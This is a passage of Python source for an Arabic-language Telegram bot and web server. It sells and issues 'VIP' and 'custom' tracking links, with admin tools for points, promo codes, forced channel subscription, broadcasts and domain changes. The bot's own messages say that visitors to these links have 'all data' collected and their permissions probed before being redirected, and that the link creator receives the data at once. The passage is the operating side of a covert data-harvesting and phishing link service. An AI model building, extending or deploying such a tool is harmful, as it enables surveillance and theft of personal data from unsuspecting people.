        user_info = users[target_user_id]
        points = user_info.get('points', 0)
        referrals_count = len(user_info.get('referrals', []))
        created_at = user_info.get('created_at', 'غير معروف')
        
        keyboard = [
            [InlineKeyboardButton("🔄 تحويل النقاط (استبدال)", callback_data=f"points_replace_{target_user_id}")],
            [InlineKeyboardButton("➕ زيادة النقاط (إضافة)", callback_data=f"points_add_{target_user_id}")],
            [InlineKeyboardButton("❌ إلغاء", callback_data=f"cancel_points_{target_user_id}")]
        ]
        
        await update.message.reply_text(
            f"📋 معلومات المستخدم:\n\n"
            f"👤 ID: {target_user_id}\n"
            f"💎 النقاط الحالية: {points}\n"
            f"👥 الإحالات: {referrals_count}\n"
            f"📅 تاريخ التسجيل: {created_at}\n\n"
            f"❓ ماذا تريد أن تفعل؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data['waiting_for_points_user_id'] = False
        return
    
    if context.user_data.get('waiting_for_points_amount'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        try:
            points_amount = int(text.strip())
            if points_amount < 0:
                await update.message.reply_text("❌ عدد النقاط لا يمكن أن يكون سالباً!\n\nحاول مرة أخرى:")
                return
            
            target_user_id = context.user_data.get('points_target_user')
            operation = context.user_data.get('points_operation')
            
            users = load_users()
            if target_user_id not in users:
                await update.message.reply_text("❌ المستخدم غير موجود!\n\nأرسل /start للرجوع")
                context.user_data['waiting_for_points_amount'] = False
                return
            
            old_points = users[target_user_id].get('points', 0)
            
            if operation == 'replace':
                users[target_user_id]['points'] = points_amount
                new_points = points_amount
                operation_text = "تحويل النقاط (استبدال)"
                operation_emoji = "🔄"
            elif operation == 'add':
                users[target_user_id]['points'] = old_points + points_amount
                new_points = old_points + points_amount
                operation_text = "زيادة النقاط (إضافة)"
                operation_emoji = "➕"
            else:
                await update.message.reply_text("❌ خطأ في العملية!\n\nأرسل /start للرجوع")
                context.user_data['waiting_for_points_amount'] = False
                return
            
            save_users(users)
            
            await update.message.reply_text(
                f"✅ تم تعديل النقاط بنجاح!\n\n"
                f"{operation_emoji} العملية: {operation_text}\n"
                f"👤 ID المستخدم: {target_user_id}\n"
                f"💎 النقاط القديمة: {old_points}\n"
                f"💎 النقاط الجديدة: {new_points}\n\n"
                f"أرسل /start للرجوع"
            )
            
            assistant_admins = load_assistant_admins()
            if str(user_id) in assistant_admins and not is_main_admin(user_id):
                try:
                    admin_username = update.effective_user.username
                    username_text = f"@{admin_username}" if admin_username else "لا يوجد"
                    
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 إشعار: إدمن مساعد عدّل نقاط مستخدم\n\n"
                             f"👤 ID الإدمن المساعد: {user_id}\n"
                             f"📱 المعرف: {username_text}\n"
                             f"{operation_emoji} العملية: {operation_text}\n\n"
                             f"المستخدم المستهدف:\n"
                             f"👤 ID: {target_user_id}\n"
                             f"💎 النقاط القديمة: {old_points}\n"
                             f"💎 النقاط المُضافة/المُحولة: {points_amount}\n"
                             f"💎 النقاط الجديدة: {new_points}\n"
                             f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                        parse_mode='HTML'
                    )
                except Exception as e:
                    print(f"خطأ في إرسال إشعار للإدمن الرئيسي: {e}")
            
            context.user_data['waiting_for_points_amount'] = False
            context.user_data.pop('points_target_user', None)
            context.user_data.pop('points_operation', None)
        except ValueError:
            await update.message.reply_text("❌ يجب إدخال رقم صحيح!\n\nحاول مرة أخرى:")
        return
    
    if context.user_data.get('waiting_for_promo_points'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        try:
            points = int(text)
            if points <= 0:
                await update.message.reply_text("❌ يجب أن يكون عدد النقاط أكبر من 0\n\nحاول مرة أخرى:")
                return
            
            promo_code = f"PROMO_{secrets.token_hex(4).upper()}"
            
            promo_links = load_promo_links()
            promo_links[promo_code] = {
                'code': promo_code,
                'points': points,
                'created_at': datetime.now().isoformat(),
                'created_by': user_id,
                'usage_count': 0,
                'used_by': []
            }
            save_promo_links(promo_links)
            
            context.user_data['waiting_for_promo_points'] = False
            
            promo_link = f"https://t.me/{context.bot.username}?start={promo_code}"
            
            await update.message.reply_text(
                f"✅ تم إنشاء الرابط الترويجي بنجاح!\n\n"
                f"🎁 كود الرابط: <code>{promo_code}</code>\n"
                f"💎 النقاط: {points}\n"
                f"📅 تاريخ الإنشاء: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                f"🔗 الرابط الترويجي:\n{promo_link}\n\n"
                f"📊 عند استخدام هذا الرابط، سيحصل المستخدم على {points} نقطة!\n\n"
                f"استخدم /start للرجوع للقائمة",
                parse_mode='HTML'
            )
        except ValueError:
            await update.message.reply_text("❌ يجب إدخال رقم صحيح!\n\nحاول مرة أخرى:")
        return
    
    if context.user_data.get('waiting_for_channel_data'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        try:
            parts = [p.strip() for p in text.split('|')]
            
            if len(parts) != 3:
                await update.message.reply_text(
                    "❌ صيغة خاطئة!\n\n"
                    "يجب أن تكون بالصيغة:\n"
                    "اسم القناة | @username | -1001234567890\n\n"
                    "حاول مرة أخرى:"
                )
                return
            
            channel_name = parts[0]
            channel_username = parts[1]
            channel_id = parts[2]
            
            if not channel_username.startswith('@'):
                channel_username = '@' + channel_username
            
            channels = load_forced_channels()
            
            for ch in channels:
                if str(ch.get('channel_id')) == str(channel_id):
                    await update.message.reply_text(
                        f"⚠️ هذه القناة موجودة بالفعل!\n\n"
                        f"📢 {ch.get('channel_name')}\n\n"
                        f"أرسل /start للرجوع"
                    )
                    context.user_data['waiting_for_channel_data'] = False
                    return
            
            new_channel = {
                'channel_id': channel_id,
                'channel_name': channel_name,
                'channel_username': channel_username,
                'added_at': datetime.now().isoformat(),
                'added_by': user_id
            }
            
            channels.append(new_channel)
            save_forced_channels(channels)
            
            context.user_data['waiting_for_channel_data'] = False
            
            await update.message.reply_text(
                f"✅ تم إضافة القناة بنجاح!\n\n"
                f"📢 اسم القناة: {channel_name}\n"
                f"👤 اليوزر: {channel_username}\n"
                f"🆔 المعرف: <code>{channel_id}</code>\n\n"
                f"📊 إجمالي القنوات الإجبارية: {len(channels)}\n\n"
                f"🔔 الآن جميع المستخدمين يجب أن يشتركوا في هذه القناة لاستخدام البوت!\n\n"
                f"استخدم /start للرجوع للقائمة",
                parse_mode='HTML'
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ في إضافة القناة!\n\n"
                f"الخطأ: {str(e)}\n\n"
                f"تأكد من صحة البيانات وحاول مرة أخرى."
            )
        return
    
    if context.user_data.get('waiting_for_broadcast'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        broadcast_text = update.message.text
        users = load_users()
        
        successful = 0
        failed = 0
        
        status_msg = await update.message.reply_text(
            f"📣 جاري إرسال الرسالة إلى {len(users)} مستخدم...\n"
            f"⏳ الرجاء الانتظار..."
        )
        
        for uid in users.keys():
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 <b>إشعار من الإدارة:</b>\n\n{broadcast_text}",
                    parse_mode='HTML'
                )
                successful += 1
            except Exception as e:
                failed += 1
                print(f"فشل إرسال الرسالة للمستخدم {uid}: {e}")
        
        context.user_data['waiting_for_broadcast'] = False
        
        await status_msg.edit_text(
            f"✅ تم إرسال الإذاعة بنجاح!\n\n"
            f"📊 الإحصائيات:\n"
            f"✅ نجح: {successful}\n"
            f"❌ فشل: {failed}\n"
            f"📝 إجمالي المستخدمين: {len(users)}\n\n"
            f"استخدم /start للرجوع للقائمة"
        )
        return
    
    if context.user_data.get('waiting_for_old_domain'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        old_domain = update.message.text.strip()
        old_domain = old_domain.rstrip('/')
        
        context.user_data['old_domain'] = old_domain
        context.user_data['waiting_for_old_domain'] = False
        context.user_data['waiting_for_new_domain'] = True
        
        await update.message.reply_text(
            f"✅ تم حفظ الدومين القديم:\n{old_domain}\n\n"
            f"⚙️ تغيير الدومين - الخطوة 2/2\n\n"
            f"📝 الآن أرسل الدومين الجديد:\n\n"
            f"مثال: https://qmy00.wispbyte.org"
        )
        return
    
    if context.user_data.get('waiting_for_new_domain'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        old_domain = context.user_data.get('old_domain', '')
        new_domain = update.message.text.strip()
        new_domain = new_domain.rstrip('/')
        
        config = load_config()
        config['domain'] = new_domain
        save_config(config)
        
        context.user_data['waiting_for_new_domain'] = False
        context.user_data.pop('old_domain', None)
        
        await update.message.reply_text(
            f"✅ تم تغيير الدومين بنجاح!\n\n"
            f"🔄 الدومين القديم:\n{old_domain}\n\n"
            f"🌐 الدومين الجديد:\n{new_domain}\n\n"
            f"📊 جميع الروابط للمستخدمين (الجدد والقدامى) الآن تستخدم الدومين الجديد!\n\n"
            f"💡 يُنصح بإعادة تشغيل البوت لتطبيق التغييرات بشكل كامل.\n\n"
            f"استخدم /start للرجوع للقائمة"
        )
        return
    
    if context.user_data.get('waiting_for_custom_domain'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        custom_domain = update.message.text.strip()
        
        if not custom_domain.startswith('http://') and not custom_domain.startswith('https://'):
            await update.message.reply_text(
                "⚠️ خطأ في صيغة الدومين!\n\n"
                "❌ يجب أن يبدأ الدومين بـ http:// أو https://\n\n"
                "✅ أمثلة صحيحة:\n"
                "• https://gizawi.com\n"
                "• http://gizawi.com\n\n"
                "📝 أرسل الدومين مرة أخرى:"
            )
            return
        
        custom_domain = custom_domain.rstrip('/')
        
        if ':' in custom_domain.split('//')[-1]:
            port_part = custom_domain.split('//')[-1]
            if ':' in port_part and '/' not in port_part.split(':')[1]:
                domain_without_port = '://'.join([custom_domain.split('://')[0], port_part.split(':')[0]])
                await update.message.reply_text(
                    f"⚠️ تنبيه: تم اكتشاف رقم Port في الدومين!\n\n"
                    f"❌ الدومين المدخل:\n{custom_domain}\n\n"
                    f"✅ سيتم استخدام:\n{domain_without_port}\n\n"
                    f"💡 لا تحتاج لإضافة رقم Port للدومينات المخصصة.\n\n"
                    f"📝 هل تريد المتابعة بـ {domain_without_port}؟\n"
                    f"أرسل 'نعم' للمتابعة أو أرسل دومين جديد:"
                )
                context.user_data['pending_custom_domain'] = domain_without_port
                return
        
        old_domain = get_domain()
        
        config = load_config()
        config['domain'] = custom_domain
        save_config(config)
        
        context.user_data['waiting_for_custom_domain'] = False
        context.user_data.pop('pending_custom_domain', None)
        
        await update.message.reply_text(
            f"✅ تم تعيين الدومين المخصص بنجاح!\n\n"
            f"🔄 الدومين السابق:\n{old_domain}\n\n"
            f"🌐 الدومين المخصص الجديد:\n{custom_domain}\n\n"
            f"📊 معلومات إضافية:\n"
            f"• جميع الروابط الآن تستخدم الدومين الجديد\n"
            f"• لا يوجد رقم Port في الرابط\n"
            f"• الدومين جاهز للاستخدام مباشرة\n\n"
            f"💡 تأكد من:\n"
            f"• إعداد DNS في Cloudflare\n"
            f"• توجيه A Record للـ IP الصحيح\n"
            f"• SSL/TLS على Flexible\n\n"
            f"استخدم /start للرجوع للقائمة"
        )
        return
    
    if context.user_data.get('pending_custom_domain'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        user_response = update.message.text.strip()
        
        if user_response.lower() in ['نعم', 'yes', 'موافق', 'ok']:
            pending_domain = context.user_data.get('pending_custom_domain', '')
            old_domain = get_domain()
            
            config = load_config()
            config['domain'] = pending_domain
            save_config(config)
            
            context.user_data['waiting_for_custom_domain'] = False
            context.user_data.pop('pending_custom_domain', None)
            
            await update.message.reply_text(
                f"✅ تم تعيين الدومين المخصص بنجاح!\n\n"
                f"🔄 الدومين السابق:\n{old_domain}\n\n"
                f"🌐 الدومين المخصص الجديد:\n{pending_domain}\n\n"
                f"📊 معلومات إضافية:\n"
                f"• جميع الروابط الآن تستخدم الدومين الجديد\n"
                f"• لا يوجد رقم Port في الرابط\n"
                f"• الدومين جاهز للاستخدام مباشرة\n\n"
                f"💡 تأكد من:\n"
                f"• إعداد DNS في Cloudflare\n"
                f"• توجيه A Record للـ IP الصحيح\n"
                f"• SSL/TLS على Flexible\n\n"
                f"استخدم /start للرجوع للقائمة"
            )
            return
        else:
            if user_response.startswith('http://') or user_response.startswith('https://'):
                custom_domain = user_response.rstrip('/')
                old_domain = get_domain()
                
                config = load_config()
                config['domain'] = custom_domain
                save_config(config)
                
                context.user_data['waiting_for_custom_domain'] = False
                context.user_data.pop('pending_custom_domain', None)
                
                await update.message.reply_text(
                    f"✅ تم تعيين الدومين المخصص بنجاح!\n\n"
                    f"🔄 الدومين السابق:\n{old_domain}\n\n"
                    f"🌐 الدومين المخصص الجديد:\n{custom_domain}\n\n"
                    f"📊 معلومات إضافية:\n"
                    f"• جميع الروابط الآن تستخدم الدومين الجديد\n"
                    f"• لا يوجد رقم Port في الرابط\n"
                    f"• الدومين جاهز للاستخدام مباشرة\n\n"
                    f"💡 تأكد من:\n"
                    f"• إعداد DNS في Cloudflare\n"
                    f"• توجيه A Record للـ IP الصحيح\n"
                    f"• SSL/TLS على Flexible\n\n"
                    f"استخدم /start للرجوع للقائمة"
                )
                return
            else:
                await update.message.reply_text(
                    "⚠️ خطأ في صيغة الدومين!\n\n"
                    "📝 أرسل 'نعم' للمتابعة بالدومين السابق\n"
                    "أو أرسل دومين جديد يبدأ بـ http:// أو https://"
                )
                return
    
    if context.user_data.get('waiting_for_vip_link'):
        text = update.message.text.strip()
        
        if not text.startswith('http://') and not text.startswith('https://'):
            await update.message.reply_text("⚠️ الرابط يجب أن يبدأ بـ http:// أو https://\n\nأرسل الرابط مرة أخرى:")
            return
        
        users = load_users()
        if user_id not in users:
            users[user_id] = {
                'user_id': user_id,
                'points': 0,
                'created_at': datetime.now().isoformat(),
                'referrals': [],
                'total_visits': 0
            }
        
        if 'vip_links' not in users[user_id]:
            users[user_id]['vip_links'] = []
        
        vip_type = context.user_data.get('vip_type', 'regular')
        next_version = len(users[user_id]['vip_links']) + 1
        vip_image = context.user_data.get('temp_vip_image', '')
        
        vip_link_data = {
            'version': next_version,
            'image': vip_image,
            'redirect_link': text,
            'is_permanent': vip_type == 'permanent',
            'created_at': datetime.now().isoformat()
        }
        
        if vip_type == 'regular':
            expiry_date = datetime.now() + timedelta(days=7)
            vip_link_data['expiry'] = expiry_date.isoformat()
        
        users[user_id]['vip_links'].append(vip_link_data)
        save_users(users)
        
        sessions = load_sessions()
        if user_id not in sessions:
            sessions[user_id] = {
                'user_id': user_id,
                'visits': 0,
                'created_at': datetime.now().isoformat()
            }
        save_sessions(sessions)
        
        context.user_data['waiting_for_vip_link'] = False
        context.user_data['vip_type'] = None
        context.user_data['temp_vip_image'] = None
        
        domain = get_domain()
        vip_link = f"https://{domain}/Vip/{next_version}/{user_id}"
        
        keyboard = [
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if vip_type == 'permanent':
            await update.message.reply_text(
                f"✅ تم إنشاء رابط VIP دائم بنجاح!\n\n"
                f"👑 رابط VIP #{next_version}:\n{vip_link}\n\n"
                f"🔗 رابط التوجيه:\n{text}\n\n"
                f"🎨 الصورة: تم حفظها\n\n"
                f"✨ صلاحية الرابط: دائم - لا ينتهي أبداً!\n"
                f"📅 تم الإنشاء: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                f"📊 عند زيارة الرابط:\n"
                f"• سيتم جمع جميع البيانات\n"
                f"• سيتم التحقق من جميع الصلاحيات\n"
                f"• سيتم التوجيه للرابط الذي حددته\n"
                f"• ستستلم جميع البيانات على الفور\n\n"
                f"💎 رابط VIP دائم - لا يحتاج تجديد!",
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                f"✅ تم إنشاء رابط VIP بنجاح!\n\n"
                f"👑 رابط VIP #{next_version}:\n{vip_link}\n\n"
                f"🔗 رابط التوجيه:\n{text}\n\n"
                f"🎨 الصورة: تم حفظها\n\n"
                f"⏰ صلاحية الرابط: 7 أيام\n"
                f"📅 ينتهي في: {expiry_date.strftime('%Y-%m-%d %H:%M')}\n\n"
                f"📊 عند زيارة الرابط:\n"
                f"• سيتم جمع جميع البيانات\n"
                f"• سيتم التحقق من جميع الصلاحيات\n"
                f"• سيتم التوجيه للرابط الذي حددته\n"
                f"• ستستلم جميع البيانات على الفور\n\n"
                f"💡 بعد انتهاء الأسبوع، يمكنك إنشاء رابط VIP جديد",
                reply_markup=reply_markup
            )
        return
    
    if context.user_data.get('waiting_for_custom_redirect'):
        text = update.message.text.strip()
        
        if not text.startswith('http://') and not text.startswith('https://'):
            await update.message.reply_text("⚠️ الرابط يجب أن يبدأ بـ http:// أو https://\n\nأرسل الرابط مرة أخرى:")
            return
        
        users = load_users()
        if user_id not in users:
            users[user_id] = {
                'user_id': user_id,
                'points': 0,
                'created_at': datetime.now().isoformat(),
                'referrals': [],
                'total_visits': 0
            }
        
        if 'custom_links' not in users[user_id]:
            users[user_id]['custom_links'] = []
        
        next_version = len(users[user_id]['custom_links']) + 1
        custom_image = context.user_data.get('temp_custom_image', '')
        custom_features = context.user_data.get('custom_link_features', {})
        
        custom_link_data = {
            'version': next_version,
            'image': custom_image,
            'redirect_link': text,
            'features': custom_features,
            'created_at': datetime.now().isoformat()
        }
        
        users[user_id]['custom_links'].append(custom_link_data)
        save_users(users)
        
        sessions = load_sessions()
        if user_id not in sessions:
            sessions[user_id] = {
                'user_id': user_id,
                'visits': 0,
                'created_at': datetime.now().isoformat()
            }
        save_sessions(sessions)
        
        context.user_data['waiting_for_custom_redirect'] = False
        context.user_data['custom_link_features'] = None
        context.user_data['temp_custom_image'] = None
        
        domain = get_domain()
        custom_link = f"https://{domain}/Custom/{next_version}/{user_id}"
        
        selected_features = [k.replace('_', ' ').title() for k, v in custom_features.items() if v]
        features_text = '\n'.join([f"   ✅ {f}" for f in selected_features])
        
        keyboard = [
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ تم إنشاء الرابط الخاص بنجاح!\n\n"
            f"🎯 رابط خاص #{next_version}:\n{custom_link}\n\n"
            f"🔗 رابط التوجيه:\n{text}\n\n"
            f"🎨 الصورة: تم حفظها\n\n"
            f"📊 الخصائص المفعّلة ({len(selected_features)}):\n{features_text}\n\n"
            f"💡 سيتم جمع الخصائص المختارة فقط!\n"
            f"📅 تم الإنشاء: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🚀 شارك الرابط واحصل على البيانات المخصصة!",
            reply_markup=reply_markup
        )
        return

async def handle_share_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.data == "share":
        await query.answer("اضغط مطولاً على الملف واختر 'إعادة توجيه' للمشاركة", show_alert=True)
    elif query.data == "delete":
        await query.message.delete()
    elif query.data == "back_to_start":
        await start(update, context)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    user_data = db.get_user(user_id)
    if not user_data:
        await update.message.reply_text("❌ لم يتم العثور على بياناتك.\n\nاستخدم /start أولاً.")
        return
    
    referrals = db.get_user_referrals(user_id)
    user_session = db.get_session(user_id)
    
    message = "📊 إحصائياتك الكاملة:\n\n"
    
    if user_data.get('username'):
        message += f"👤 الاسم: @{user_data['username']}\n"
    elif user_data.get('first_name'):
        full_name = user_data.get('first_name', '')
        if user_data.get('last_name'):
            full_name += f" {user_data['last_name']}"
        message += f"👤 الاسم: {full_name}\n"
    
    message += f"🆔 ID: {user_id}\n"
    message += f"💎 النقاط: {user_data['points']} نقطة\n"
    message += f"👥 عدد الإحالات: {len(referrals)}\n"
    message += f"👁️ عدد الزيارات لرابطك: {user_session.get('visits', 0) if user_session else 0}\n"
    message += f"📅 تاريخ الانضمام: {str(user_data['created_at'])[:10]}\n\n"
    
    if referrals:
        message += "🎯 آخر 5 إحالات:\n"
        for ref in referrals[-5:]:
            ref_username = f"@{ref['username']}" if ref.get('username') else ref['referred_id']
            message += f"   • {ref_username} - {str(ref['created_at'])[:10]}\n"
    else:
        message += "🎯 لا توجد إحالات حتى الآن\n"
        message += "شارك رابط الإحالة للحصول على نقاط!\n"
    
    referral_link = f"https://t.me/{context.bot.username}?start={user_id}"
    message += f"\n🎁 رابط الإحالة الخاص بك:\n{referral_link}"
    
    if update.callback_query:
        await update.callback_query.edit_message_text(message)
    else:
        await update.message.reply_text(message)

async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    top_users = db.get_leaderboard(limit=10)
    
    if not top_users:
        await update.message.reply_text("📭 لا توجد بيانات حتى الآن.")
        return
    
    message = "🏆 لوحة المتصدرين - أعلى 10 مستخدمين:\n\n"
    
    for i, user in enumerate(top_users, 1):
        emoji = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        
        user_display = f"@{user['username']}" if user.get('username') else f"{user['user_id'][-6:]}..."
        
        message += f"{emoji} {user_display} - {user['points']} نقطة\n"
        message += f"   📊 {user.get('referral_count', 0)} إحالة\n\n"
    
    await update.message.reply_text(message)

async def list_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    user_session = db.get_session(user_id)
    if not user_session:
        await update.message.reply_text("📭 ليس لديك رابط مُنشأ حتى الآن.\n\nاستخدم /start لإنشاء رابطك.")
        return
    
    domain = get_domain()
    
    created_at = str(user_session.get('created_at', 'غير معروف'))
    visits = user_session.get('visits', 0)
    link = f"https://{domain}/p/{user_id}"
    
    message = "📋 رابطك الشخصي:\n\n"
    message += f"🔗 {link}\n"
    message += f"🆔 ID: {user_id}\n"
    message += f"📅 تاريخ الإنشاء: {created_at[:10]}\n"
    message += f"👥 عدد الزيارات: {visits}\n"
    
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📋 الأوامر المتاحة:\n\n"
        "/start - إنشاء رابطك الشخصي\n"
        "/stats - عرض إحصائياتك ونقاطك\n"
        "/leaderboard - عرض لوحة المتصدرين\n"
        "/list - عرض رابطك\n"
        "/help - عرض المساعدة\n\n"
        "💡 كيف تكسب النقاط؟\n"
        "• 2 نقطة عند الانضمام\n"
        "• 5 نقاط لكل شخص تحيله\n"
        "• المحال يحصل على 2 نقطة أيضاً!"
    )

async def track_bot_added_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إشعار الأدمن عند إضافة البوت لقناة جديدة"""
    try:
        result = update.my_chat_member
        if not result:
            return
            
        chat = result.chat
        new_status = result.new_chat_member.status
        old_status = result.old_chat_member.status
        
        print(f"[DEBUG] Bot status changed in {chat.title or chat.id}")
        print(f"[DEBUG] Old status: {old_status}, New status: {new_status}")
        
        if chat.type in ['channel', 'supergroup'] and new_status in ['left', 'kicked'] and old_status in ['administrator', 'creator']:
            channels = load_forced_channels()
            channel_id = str(chat.id)
            
            removed_channel = None
            for ch in channels:
                if str(ch.get('channel_id')) == channel_id:
                    removed_channel = ch
                    break
            
            if removed_channel:
                channels = [ch for ch in channels if str(ch.get('channel_id')) != channel_id]
                save_forced_channels(channels)
                
                try:
                    channel_name = removed_channel.get('channel_name', 'قناة غير معروفة')
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=(
                            f"⚠️ <b>تنبيه: تم طردك من قناة!</b>\n\n"
                            f"📢 القناة: {channel_name}\n"
                            f"🆔 المعرف: <code>{channel_id}</code>\n\n"
                            f"🔴 <b>تم إزالة القناة تلقائياً من الاشتراك الإجباري!</b>\n\n"
                            f"📊 القنوات المتبقية: {len(channels)}\n\n"
                            f"💡 المستخدمون الآن لا يحتاجون للاشتراك في هذه القناة"
                        ),
                        parse_mode='HTML'
                    )
                    print(f"[DEBUG] Channel {channel_id} removed from forced channels")
                except Exception as e:
                    print(f"❌ خطأ في إرسال إشعار الطرد: {e}")
        
        elif chat.type in ['channel', 'supergroup'] and new_status in ['administrator', 'creator'] and old_status in ['left', 'kicked', 'member']:
            try:
                channel_name = chat.title or "قناة غير معروفة"
                channel_id = chat.id
                channel_username = f"@{chat.username}" if chat.username else "لا يوجد"
                
                notification = (
                    f"🆕 <b>تم إضافة البوت لقناة جديدة!</b>\n\n"
                    f"📢 اسم القناة: {channel_name}\n"
                    f"🆔 معرف القناة: <code>{channel_id}</code>\n"
                    f"👤 اليوزر: {channel_username}\n"
                    f"👑 الحالة الجديدة: {new_status}\n"
                    f"📊 الحالة القديمة: {old_status}\n\n"
                    f"❓ هل تريد إضافة هذه القناة للاشتراك الإجباري؟\n"
                    f"عند الموافقة، جميع مستخدمي البوت يجب أن يشتركوا في هذه القناة!"
                )
                
                keyboard = [
                    [
                        InlineKeyboardButton("✅ نعم، إضافة للاشتراك الإجباري", 
                                           callback_data=f"add_forced_{channel_id}")
                    ],
                    [
                        InlineKeyboardButton("❌ لا، شكراً", 
                                           callback_data="cancel_add_forced")
                    ]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                context.bot_data[f'temp_channel_{channel_id}'] = {
                    'channel_id': channel_id,
                    'channel_name': channel_name,
                    'channel_username': channel_username
                }
                
                print(f"[DEBUG] Sending notification to admin {ADMIN_ID}")
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=notification,
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                print(f"[DEBUG] Notification sent successfully")
            except Exception as e:
                print(f"❌ خطأ في إرسال الإشعار للأدمن: {e}")
                import traceback
                traceback.print_exc()
    except Exception as e:
        print(f"❌ خطأ في track_bot_added_to_channel: {e}")
        import traceback
        traceback.print_exc()

async def search_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    البحث عن مستخدم بالاسم أو username أو ID
    مثال: /search @username أو /search الاسم أو /search 123456
    """
    user_id = str(update.effective_user.id)
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ هذا الأمر متاح للأدمن فقط!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔍 استخدام الأمر:\n\n"
            "/search @username\n"
            "/search الاسم\n"
            "/search 123456789\n\n"
            "مثال: /search @Ahmad\n"
            "مثال: /search محمد"
        )
        return
    
    query = ' '.join(context.args)
    
    query_clean = query.replace('@', '').strip()
    
    results = db.search_users(query_clean)
    
    if not results:
        await update.message.reply_text(f"❌ لم يتم العثور على أي مستخدم بالبحث: {query}")
        return
    
    message = f"🔍 نتائج البحث عن: {query}\n\n"
    message += f"📊 تم العثور على {len(results)} نتيجة:\n\n"
    
    for i, user in enumerate(results[:20], 1):
        user_display = ""
        if user.get('username'):
            user_display += f"@{user['username']}"
        if user.get('first_name'):
            name = user['first_name']
            if user.get('last_name'):
                name += f" {user['last_name']}"
            user_display += f" ({name})" if user_display else name
        
        if not user_display:
            user_display = f"مستخدم {user['user_id'][-6:]}..."
        
        message += f"{i}. {user_display}\n"
        message += f"   🆔 ID: <code>{user['user_id']}</code>\n"
        message += f"   💎 النقاط: {user['points']}\n"
        message += f"   📅 انضم: {str(user['created_at'])[:10]}\n\n"
    
    if len(results) > 20:
        message += f"... و{len(results) - 20} نتيجة أخرى"
    
    await update.message.reply_text(message, parse_mode='HTML')

def run_bot():
    bot_token = os.environ.get('BOT_TOKEN', '')
    
    if not bot_token:
        print("❌ خطأ: لم يتم تعيين BOT_TOKEN في المتغيرات البيئية!")
        print("يرجى تعيين BOT_TOKEN في ملف .env أو في إعدادات Replit")
        return
    
    application = Application.builder().token(bot_token).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('stats', stats))
    application.add_handler(CommandHandler('leaderboard', leaderboard))
    application.add_handler(CommandHandler('list', list_links))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('search', search_user))
    application.add_handler(CallbackQueryHandler(handle_share_delete, pattern="^(share|delete|back_to_start)$"))
    application.add_handler(CallbackQueryHandler(handle_button))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(ChatMemberHandler(track_bot_added_to_channel, ChatMemberHandler.MY_CHAT_MEMBER))
    
    print("✅ البوت يعمل الآن...")
    print("📱 الأوامر المتاحة: /start, /stats, /leaderboard, /list, /search, /help")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

def run_server():
    app.run(host='0.0.0.0', port=13760, debug=False)

if __name__ == '__main__':
    bot_token = os.environ.get('BOT_TOKEN', '')
    
    if not bot_token:
        print("\n" + "="*50)
        print("❌ خطأ: لم يتم تعيين BOT_TOKEN!")
        print("="*50)
        print("\nيرجى إضافة BOT_TOKEN في Secrets:")
        print("1. اذهب إلى Tools > Secrets")
        print("2. أضف Secret جديد:")
        print("   - Key: BOT_TOKEN")
        print("   - Value: توكن البوت من @BotFather")
        print("\n" + "="*50 + "\n")
        sys.exit(1)
    
    print("\n" + "="*50)
    print("🚀 بدء تشغيل النظام...")
    print("="*50 + "\n")
    
    multiprocessing.set_start_method('fork', force=True)
    
    bot_process = multiprocessing.Process(target=run_bot, daemon=True)
    bot_process.start()
    print("✅ تم تشغيل بوت تليجرام")
    
    print("✅ تم تشغيل سيرفر الويب على المنفذ 13760")
    print("\n" + "="*50)
    print("📱 أرسل /start للبوت لإنشاء رابط جديد")
    print("="*50 + "\n")
    
    run_server()